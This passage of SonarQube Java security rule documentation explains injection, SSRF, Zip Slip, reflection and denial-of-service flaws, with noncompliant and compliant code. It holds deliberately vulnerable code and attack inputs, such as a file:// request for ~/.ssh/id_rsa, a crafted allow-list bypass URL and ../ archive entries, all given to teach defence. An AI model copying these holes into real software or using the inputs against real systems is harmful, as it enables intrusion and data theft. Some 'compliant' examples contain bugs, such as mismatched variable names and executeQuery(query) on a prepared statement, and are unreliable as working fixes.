        String query &#61; &#34;SELECT * FROM users WHERE user &#61; ? AND pass &#61; ?&#34;;

        try (PreparedStatement statement &#61; connection.prepareStatement(query)) {
            statement.setString(1, user);
            statement.setString(2, pass);

            ResultSet resultSet &#61; statement.executeQuery(query);

            if (!resultSet.next()) {
                return new ResponseEntity&lt;&gt;(&#34;Unauthorized&#34;, HttpStatus.UNAUTHORIZED);
            }
        }

        return new ResponseEntity&lt;&gt;(&#34;Authentication Success&#34;, HttpStatus.OK);
    }
}
</pre>
<h3>How does this work?</h3>
<h4>Use prepared statements</h4>
<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of an
interpreted context.</p>
<p>For database queries, prepared statements are a natural mechanism to achieve this due to their internal workings.<br /> Here is an example with the
following query string (Java SE syntax):</p>
<pre>
SELECT * FROM users WHERE user &#61; ? AND pass &#61; ?
</pre>
<p><strong>Note: Placeholders may take different forms, depending on the library used. For the above example, the question mark symbol &#39;?&#39; was used as
a placeholder.</strong></p>
<p>When a prepared statement is used by an application, the database server compiles the query logic even before the application passes the literals
corresponding to the placeholders to the database.<br /> Some libraries expose a <code>prepareStatement</code> function that explicitly does so, and
some do not - because they do it transparently.</p>
<p>The compiled code that contains the query logic also includes the placeholders: they serve as parameters.</p>
<p>After compilation, the query logic is frozen and cannot be changed.<br /> So when the application passes the literals that replace the placeholders,
they are not considered application logic by the database.</p>
<p>Consequently, the database server prevents the dynamic literals of a prepared statement from affecting the underlying query, and thus sanitizes
them.</p>
<p>On the other hand, the application does not automatically sanitize third-party data (for example, user-controlled data) inserted directly into a
query. An attacker who controls this third-party data can cause the database to execute malicious code.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://blog.sonarsource.com/exploiting-hibernate-injections/" rel="nofollow">SonarSource, Exploiting Hibernate Injections</a> </li><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" rel="nofollow">OWASP, SQL Injection Prevention Cheat
  Sheet</a> </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS, Top 25 Software Errors</a> - Insecure Interaction Between Components </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/89" rel="nofollow">MITRE, CWE-89</a> - Improper Neutralization of Special Elements used in an SQL Command
  </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/ITdGBQ" rel="nofollow">CERT, IDS00-J.</a> - Prevent SQL injection </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S6390">
              javasecurity:S6390
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Most modern applications use threads to handle incoming requests or other long-running tasks concurrently. In some cases, the number of concurrent
threads is limited to avoid system resource exhaustion due to too numerous actions being run.</p>
<p>When an application uses user-controlled data as a parameter of a thread suspension operation, a Denial of Service attack can be made possible.</p>
<h3>What is the potential impact?</h3>
<p>An attacker with the capability to insert an arbitrary duration into a thread suspension operation could suspend the corresponding thread for a
long time. Depending on the application’s architecture and the thread handling logic, this can lead to a complete Denial of Service of the
application.</p>
<p>Indeed, if the number of threads, either created by the application or allocated by a web server, is limited, the attacker will be able to suspend
all of them at the same time. Without any remaining thread to handle actions, the application might badly answer, be slowed down, or become completely
irresponsive.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>This code is vulnerable to a Denial of Service because it sets a thread’s suspension time from user input without prior validation or
sanitation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        Long time &#61; Long.parseLong(req.getParameter(&#34;time&#34;));
        try {
            Thread.sleep(time); // Noncompliant
        } catch (InterruptedException e) {
            resp.sendError(500);
        }
    }
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
protected void compliant(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        Long time &#61; Long.parseLong(req.getParameter(&#34;time&#34;));
        try {
            Thread.sleep(Math.min(time, 1000));
        } catch (InterruptedException e) {
            resp.sendError(500);
        }
    }
</pre>
<h3>How does this work?</h3>
<p>In most cases, it is discouraged to define a thread suspension time from user-input.</p>
<p>If really necessary, the application should ensure that the provided suspension time is below a safe limit. Such a limit should be evaluated and
set to the lowest possible time that ensures the application’s operation and restricts denial of service attacks.</p>
<p>The example compliant code uses the <code>Math.min</code> function to ensure the suspension duration is below the limit of one second.</p>
<p>Note that even when the suspension time is limited, an attacker who submits numerous requests at high speed can still manage always to consume all
available threads.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/400" rel="nofollow">MITRE, CWE-400</a> - Uncontrolled Resource Consumption </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S6398">
              javasecurity:S6398
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>JSON injections occur when an application builds a JSON-formatted string from user input without prior validation or sanitation. In such a case, a
tainted user-controlled value can tamper with the JSON string content. Especially, unexpected arbitrary elements can be inserted in the corresponding
JSON object. Those modifications can include:</p>
<ul><li> Adding additional keys to a JSON dictionary. </li><li> Changing values types. </li><li> Adding elements in an array. </li></ul>
<p>A malicious user-supplied value can perform other modifications depending on where and how the constructed data is later used.</p>
<h3>What is the potential impact?</h3>
<p>The consequences of a JSON injection attack into an application vary greatly depending on the application’s logic. It can affect the application
itself or another element if the JSON string is used for cross-component data exchange. For this reason, the actual impact can range from benign
information disclosure to critical remote code execution.</p>
<h4>Information disclosure</h4>
<p>An attacker can forge an attack payload that will modify the JSON string so that it will become syntactically incorrect. In that case, when the
data is later used, the parsing component will raise a technical error. If displayed back to the attacker or made available through log files, this
technical error may disclose sensitive business or technical information.</p>
<p>This scenario, while in general the less severe one, is the most frequently encountered. It can combine with any other logic-dependant threat.</p>
<h4>Privilege escalation</h4>
<p>An application that would rely on JSON to store or propagate users&#39; authentication levels and roles would be under threat of privilege escalations.
Indeed, an attacker could tamper with the permissions storage object to insert arbitrary roles or privileges.</p>
<p>While highly specific, similar issues can be faced in the following situations:</p>
<ul><li> An application builds JSON payloads for HTTP requests. </li><li> An application builds JWT from user input. </li></ul>
<h4>Code execution</h4>
<p>An application might build objects based on a JSON serialization string. In that case, an attacker that would exploit a JSON injection could be
able to alter the serialization string to modify the corresponding object’s properties.</p>
<p>Depending on the deserialization process, this might allow instantiating arbitrary objects or objects with sensitive properties altered. This can
lead to arbitrary code being executed in the same way as a deserialization injection vulnerability.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to a JSON injection vulnerability because it builds a JSON string from user input without prior sanitation or
validation. Therefore, an attacker can submit a tainted value that will tamper with the corresponding JSON object structure.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="21" data-diff-type="noncompliant">
import org.json.JSONObject;

public void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
    try {
        String tainted &#61; request.getParameter(&#34;value&#34;);
        String json &#61; &#34;{\&#34;key\&#34;:\&#34;&#34;&#43; tainted &#43;&#34;\&#34;}&#34;;
        JSONObject obj &#61; new JSONObject(json); // Noncompliant
    } catch (JsonException e) {
        resp.sendError(400)
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="21" data-diff-type="compliant">
import org.json.JSONObject;

public void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
    JSONObject obj &#61; new JSONObject(json);
    obj.put(&#34;key&#34;, request.getParameter(&#34;value&#34;));
}
</pre>
<h3>How does this work?</h3>
<p>In most cases, it is discouraged to build JSON strings with a direct concatenation of user input. While not always possible, a strong pattern-based
validation can help sanitize tainted inputs. Likewise, converting to a harmless type can sometimes be a solution.</p>
<p>However, avoiding handling objects&#39; properties as strings by directly constructing Java objects should be the preferred way.</p>
<h4>Programmatic object building</h4>
<p>In most cases, an application can directly create objects from user input without having to build and parse a JSON string. Doing so prevents
injection vulnerabilities as JSON object construction libraries and functions will properly escape and check the type of input values.</p>
<p>Sometimes, the application might need to include the user input in an object built from a trusted JSON string. In that case, the recommended
solution is to parse the trusted string first and then programmatically modify the resulting object.</p>
<p>The example compliant code uses the <code>org.json</code> libraries capabilities to dynamically build a JSON object without string parsing.</p>
<h4>Converting to a harmless type</h4>
<p>When the application allows it, converting user-submitted data to a harmless type can help prevent JSON injection vulnerabilities. In particular,
converting user inputs to numeric types is an efficient sanitation mechanism.</p>
<p>This mechanism can be extended to other types, including more complex ones. However, care should be taken when dealing with them, as manually
validating or sanitizing complex types can represent a challenge.</p>
<p>Note that choosing this solution can be error-prone: every user input has to be validated or sanitized without oversight.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://www.talosintelligence.com/vulnerability_reports/TALOS-2018-0556" rel="nofollow">CVE-2018-3879 - An exploitable JSON injection
  vulnerability</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/76" rel="nofollow">MITRE, CWE-76</a> - Improper Neutralization of Equivalent Special Elements </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S5144">
              javasecurity:S5144
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Server-Side Request Forgery (SSRF) occurs when attackers can coerce a server to perform arbitrary requests on their behalf.<br /></p>
<p>An SSRF vulnerability can either be basic or blind, depending on whether the server’s fetched data is directly returned in the web application’s
response.<br /> The absence of the corresponding response for the coerced request on the application is not a barrier to exploitation and thus must be
treated in the same way as basic SSRF.</p>
<h3>What is the potential impact?</h3>
<p>SSRF usually results in unauthorized actions or data disclosure in the vulnerable application or on a different system it can reach. Conditional to
what is reachable, remote command execution can be achieved, although it often requires chaining with further exploitations.</p>
<p>Information disclosure is SSRF’s core outcome. Depending on the extracted data, an attacker can perform a variety of different actions that can
range from low to critical severity.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Local file read to host takeover</h4>
<p>An attacker manipulates an application into performing a local request for a sensitive file, such as <code>~/.ssh/id_rsa</code>, by using the File
URI scheme <code>file://</code>.<br /> Once in possession of the SSH keys, the attacker establishes a remote connection to the system hosting the web
application.</p>
<h4>Internal Network Reconnaissance</h4>
<p>An attacker enumerates internal accessible ports from the affected server or others to which the server can communicate by iterating over the port
field in the URL <code>http://127.0.0.1:{port}</code>.<br /> Taking advantage of other supported URL schemas (dependent on the affected system), for
example, <code>gopher://127.0.0.1:3306</code>, an attacker would be able to connect to a database service and perform queries on it.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to SSRF as it performs an HTTP request to a URL defined by untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
    String location &#61; req.getParameter(&#34;url&#34;);

    URL url &#61; new URL(location);

    HttpURLConnection  conn &#61; (HttpURLConnection) url.openConnection();
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
    String location &#61; req.getParameter(&#34;url&#34;);

    List&lt;String&gt; allowedHosts &#61; new ArrayList&lt;String&gt;();
    allowedHosts.add(&#34;https://trusted1.example.com/&#34;);
    allowedHosts.add(&#34;https://trusted2.example.com/&#34;);

    URL url &#61; new URL(location);

    if (allowedHosts.contains(location))
        HttpURLConnection conn &#61; (HttpURLConnection) url.openConnection();
}
</pre>
<h3>How does this work?</h3>
<p>The application should avoid opening URLs that are constructed with untrusted data.</p>
<p>When such a feature is strictly necessary, SSRF can be mitigated by applying an allow-list of trustable schemes and domains.</p>
<p>The compliant code example uses such an approach.</p>
<h3>Pitfalls</h3>
<h4>The trap of &#39;StartsWith&#39; and equivalents</h4>
<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure
that the validation string contains a path separator <code>/</code> as the last character</strong>.<br /></p>
<p>If the validation string does not contain a terminating path separator, the SSRF vulnerability remains; only the exploitation technique
changes.</p>
<p>Thus, a validation like <code>startsWith(&#34;https://example.com&#34;)</code> or an equivalent with the regex <code>^https://example\.com.*</code> can be
exploited with the following URL <code>https://example.commit.malicious.io</code>.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/" rel="nofollow">OWASP Top 10 2021 Category A10</a> - Server-Side Request
  Forgery (SSRF) </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/918" rel="nofollow">MITRE, CWE-918</a> - Server-Side Request Forgery (SSRF) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S6350">
              javasecurity:S6350
            </a>
          </td>
          <td>
            <details>
              <p>Constructing arguments of system commands from user input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2016-9920" rel="nofollow">CVE-2016-9920</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2021-29472" rel="nofollow">CVE-2021-29472</a> </li></ul>
<p>Arguments of system commands are processed by the executed program. The arguments are usually used to configure and influence the behavior of the
programs. Control over a single argument might be enough for an attacker to trigger dangerous features like executing arbitrary commands or writing
files into specific directories.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Malicious arguments can result in undesired behavior in the executed command. </li><li> Passing user input to a system command is not necessary. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Avoid constructing system commands from user input when possible. </li><li> Ensure that no risky arguments can be injected for the given program, e.g., type-cast the argument to an integer. </li><li> Use a more secure interface to communicate with other programs, e.g., the standard input stream (stdin). </li></ul>
<h2>Sensitive Code Example</h2>
<p>Arguments like <code>-delete</code> or <code>-exec</code> for the <code>find</code> command can alter the expected behavior and result in
vulnerabilities:</p>
<pre>
String input &#61; request.getParameter(&#34;input&#34;);
String cmd[] &#61;  new String[] { &#34;/usr/bin/find&#34;, input };
Runtime.getRuntime().exec(cmd); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Use an allow-list to restrict the arguments to trusted values:</p>
<pre>
String input &#61; request.getParameter(&#34;input&#34;);
if (allowed.contains(input)) {
  String cmd[] &#61;  new String[] { &#34;/usr/bin/find&#34;, input };
  Runtime.getRuntime().exec(cmd);
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/88" rel="nofollow">MITRE, CWE-88</a> - Argument Injection or Modification </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li><li> <a href="https://blog.sonarsource.com/php-supply-chain-attack-on-composer" rel="nofollow">CVE-2021-29472</a> - PHP Supply Chain Attack on Composer </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S6173">
              javasecurity:S6173
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Reflection injections occur in a web application when it retrieves data from a user or a third-party service and fully or partially uses it to
inspect, load or invoke a component by name.</p>
<p>If an application uses a reflection method in a way that is vulnerable to injections, it is exposed to attacks that aim to achieve remote code
execution on the server’s website.</p>
<p>A user with malicious intent exploits this by carefully crafting a string involving symbols such as class methods, that will help them change the
initial reflection logic to an impactful malicious one.</p>
<p>After creating the malicious request and triggering it, the attacker can attack the servers affected by this vulnerability without relying on any
pre-requisites.</p>
<h3>What is the potential impact?</h3>
<p>If user-supplied values are used to choose which code is executed, an attacker may be able to supply carefully-chosen values that cause unexpected
code to run. The attacker can use this ability to run arbitrary code on the server.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Application-specific attacks</h4>
<p>In this scenario, the attackers succeed in injecting a seemingly-legitimate object, but whose properties might be used maliciously.</p>
<p>Depending on the application, attackers might be able to modify important data structures or content to escalate privileges or perform unwanted
actions. For example, with an e-commerce application, this could be changing the number of products or prices.</p>
<h4>Full application compromise</h4>
<p>In the worst-case scenario, the attackers succeed in injecting an object triggering code execution.</p>
<p>Depending on the attacker, code execution can be used with different intentions:</p>
<ul><li> Download the internal server’s data, most likely to sell it. </li><li> Modify data, install malware, for instance, malware that mines cryptocurrencies. </li><li> Stop services or exhaust resources, for instance, with fork bombs. </li></ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a Disaster Recovery Plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker additionally manages to
elevate their privileges as an administrator and attack other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
through a combination of unsafe deserialization and misconfiguration:</p>
<ul><li> Docker or Kubernetes clusters </li><li> cloud services </li><li> network firewalls and routing </li><li> OS access control </li></ul>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>In the following example, the code simulates a feature in an image editing application that allows users to install plugins to add new filters or
effects. It assumes the user will give a known name, such as &#34;SepiaEffect&#34;.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import java.lang.Class;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;

&#64;RestController
public class EffectController
{
    &#64;GetMapping(value &#61; &#34;/filter/apply&#34;)
    &#64;ResponseBody
    public ResponseEntity&lt;String&gt; apply(&#64;RequestParam(&#34;effect&#34;) String effectName)
    {
        try
        {
            Class effectClass                &#61; Class.forName(effectName);  // Noncompliant
            Constructor&lt;?&gt; effectConstructor &#61; effectClass.getConstructor();
            Object EffectObject              &#61; effectConstructor.newInstance();
            Method applyMethod               &#61; effectClass.getMethod(&#34;applyFilter&#34;);

            boolean result &#61; (boolean) applyMethod.invoke(EffectObject);

        } catch (Exception e) {}

        if (result)
        {
            return new ResponseEntity&lt;&gt;(&#34;Filter Applied&#34;, HttpStatus.OK);
        }
        else
        {
            return new ResponseEntity&lt;&gt;(&#34;Filter Failure&#34;, HttpStatus.FORBIDDEN);
        }
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import java.lang.Class;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;

&#64;RestController
public class EffectController
{
    private static Set&lt;String&gt; EFFECT_ALLOW_LIST &#61; new HashSet&lt;&gt;();

    static
    {
        allowList.add(&#34;SepiaEffect&#34;);
        allowList.add(&#34;BlackAndWhiteEffect&#34;);
        allowList.add(&#34;WaterColorEffect&#34;);
        allowList.add(&#34;OilPaintingEffect&#34;);
    }

    &#64;GetMapping(value &#61; &#34;/filter/apply&#34;)
    &#64;ResponseBody
    public ResponseEntity&lt;String&gt; apply(&#64;RequestParam(&#34;effect&#34;) String effectName)
    {
        if (!EFFECT_ALLOW_LIST.contains(effectName)) {
            return new ResponseEntity&lt;&gt;(&#34;Filter Failure&#34;, HttpStatus.FORBIDDEN);
        }

        try
        {
            Class effectClass                &#61; Class.forName(effectName);
            Constructor&lt;?&gt; effectConstructor &#61; effectClass.getConstructor();
            Object EffectObject              &#61; effectConstructor.newInstance();
            Method applyMethod               &#61; effectClass.getMethod(&#34;applyFilter&#34;);

            boolean result &#61; (boolean) applyMethod.invoke(EffectObject);

        } catch (Exception e) {}

        if (result) {
            return new ResponseEntity&lt;&gt;(&#34;Filter Applied&#34;, HttpStatus.OK);
        }
        else {
            return new ResponseEntity&lt;&gt;(&#34;Filter Failure&#34;, HttpStatus.FORBIDDEN);
        }
    }
}
</pre>
<h3>How does this work?</h3>
<h4>Pre-Approved commands</h4>
<p>The cleanest way to avoid this defect is to validate the input before using it in a reflection method.</p>
<p>Create a list of authorized and secure classes that you want the application to be able to execute.<br /> If a user input does not match an entry in
this list, it should be rejected because it is considered unsafe.</p>
<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS, Top 25 Software Errors</a> - Insecure Interaction Between Components </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/470" rel="nofollow">MITRE, CWE-470</a> - Use of Externally-Controlled Input to Select Classes or Code (&#39;Unsafe
  Reflection&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S6096">
              javasecurity:S6096
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Zip slip is a special case of path injection. It occurs when an application uses the name of an archive entry to construct a file path and access
this file without validating its path first.</p>
<p>This rule will consider all archives untrusted, assuming they have been created outside the application file system.</p>
<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, in the archive entry name to change the initial
intended path. The resulting path would resolve somewhere in the filesystem where the user should not normally have access.</p>
<h3>What is the potential impact?</h3>
<p>A web application is vulnerable to Zip Slip and an attacker is able to exploit it by submitting an archive he controls.</p>
<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with
root privileges on Linux, and therefore any file can be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Override arbitrary files</h4>
<p>The application opens the archive to copy its entries to the file system. The entries&#39; names contain path traversal payloads for existing files in
the system, which are overwritten once the entries are copied. The vulnerability is exploited to corrupt files critical for the application or
operating system to work properly.</p>
<p>It could result in data being lost or the application being unavailable.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to Zip Slip as it is constructing a path using an archive entry name. This path is then used to copy a file
without being validated first. Therefore, it can be leveraged by an attacker to overwrite arbitrary files.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public class Example {

    static private String targetDirectory &#61; &#34;/example/directory/&#34;;

    public void ExtractEntry(ZipFile zipFile) throws IOException {

        Enumeration&lt;? extends ZipEntry&gt; entries &#61; zipFile.entries();
        ZipEntry entry &#61; entries.nextElement();
        InputStream inputStream &#61; zipFile.getInputStream(entry);

        File file &#61; new File(targetDirectory &#43; entry.getName());

        Files.copy(inputStream, file.toPath(), StandardCopyOption.REPLACE_EXISTING);
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public class Example {

    static private String targetDirectory &#61; &#34;/example/directory/&#34;;

    public void ExtractEntry(ZipFile zipFile) throws IOException {

        Enumeration&lt;? extends ZipEntry&gt; entries &#61; zipFile.entries();
        ZipEntry entry &#61; entries.nextElement();
        InputStream inputStream &#61; zipFile.getInputStream(entry);

        File file &#61; new File(targetDirectory &#43; entry.getName());

        String canonicalDestinationPath &#61; file.getCanonicalPath();

        if (canonicalDestinationPath.startsWith(targetDirectory)) {
            Files.copy(inputStream, file.toPath(), StandardCopyOption.REPLACE_EXISTING, LinkOption.NOFOLLOW_LINKS);
        }
    }
}
</pre>
<h3>How does this work?</h3>
<p>The universal way to prevent Zip Slip is to validate the paths constructed from untrusted archive entry names.</p>
<p>The validation should be done as follow:</p>
<ol><li> Resolve the canonical path of the file by using methods like <code>java.io.File.getCanonicalFile</code> or
  <code>java.io.File.getCanonicalPath</code>. This will resolve relative path or path components like <code>../</code> and removes any ambiguity
  regarding the file’s location. </li><li> Check that the canonical path is within the directory where the file should be located. </li><li> Ensure the target directory path ends with a forward slash to prevent partial path traversal, for example, <strong>/base/dirmalicious</strong>
  starts with <strong>/base/dir</strong> but does not start with <strong>/base/dir/</strong>. </li></ol>
<h3>Pitfalls</h3>
<h4>Partial Path Traversal</h4>
<p>When validating untrusted paths by checking if they start with a trusted folder name, <strong>ensure the validation strings all contain a path
separator as the last character</strong>.<br /> A partial path traversal vulnerability can be unintentionally introduced into the application without a
path separator as the last character of the validation strings.</p>
<p>For example, the following code is vulnerable to partial path injection. Note that the string <code>targetDirectory</code> does not end with a path
separator:</p>
<pre>
static private String targetDirectory &#61; &#34;/Users/John&#34;;

public void ExtractEntry(ZipFile zipFile) throws IOException {

    Enumeration&lt;? extends ZipEntry&gt; entries &#61; zipFile.entries();
    ZipEntry entry &#61; entries.nextElement();
    InputStream inputStream &#61; zipFile.getInputStream(entry);

    File file &#61; new File(entry.getName());

    String canonicalDestinationPath &#61; file.getCanonicalPath();

    if (canonicalDestinationPath.startsWith(targetDirectory)) {
        Files.copy(inputStream, file.toPath(), StandardCopyOption.REPLACE_EXISTING, LinkOption.NOFOLLOW_LINKS);
    }
}
</pre>
<p>This check can be bypassed because <code>&#34;/Users/Johnny&#34;.startsWith(&#34;/Users/John&#34;)</code> returns <code>true</code>. Thus, for validation,
<code>&#34;/Users/John&#34;</code> should actually be <code>&#34;/Users/John/&#34;</code>.</p>
<p><strong>Warning</strong>: Some functions, such as <code>.getCanonicalPath</code>, remove the terminating path separator in their return value.<br />
The validation code should be tested to ensure that it cannot be impacted by this issue.</p>
<p><a href="https://github.com/aws/aws-sdk-java/security/advisories/GHSA-c28r-hw5m-5gv3" rel="nofollow">Here is a real-life example of this vulnerability.</a></p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://snyk.io/research/zip-slip-vulnerability" rel="nofollow">snyk</a> - Zip Slip Vulnerability </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/22" rel="nofollow">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory (&#39;Path
  Traversal&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S2091">
              javasecurity:S2091
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>XPath injections occur in an application when the application retrieves untrusted data and inserts it into an XML Path (XPath) query without
sanitizing it first.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application vulnerable to XPath injection:<br /> After discovering the injection point, attackers insert data into the
vulnerable field to execute malicious commands in the affected XML documents.</p>
<p>The impact of this vulnerability depends on the importance of XML structures in the enterprise.<br /> In cases where organizations rely on XML
structures for business-critical operations or where XML is used only for innocuous data transport, the severity of an attack ranges from critical to
harmless.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Data Leaks</h4>
<p>A malicious XPath query allows direct data leakage from one or more databases. Although XML is not as widely used as it once was, this possibility
still exists with configuration files, for example.</p>
<h4>Data deletion and denial of service</h4>
<p>The malicious query allows the attacker to delete data in the affected XML documents.<br /> This threat is particularly insidious if the attacked
organization does not maintain a disaster recovery plan (DRP) and if XML structures are considered important, as missing critical data can disrupt the
regular operations of an organization.</p>
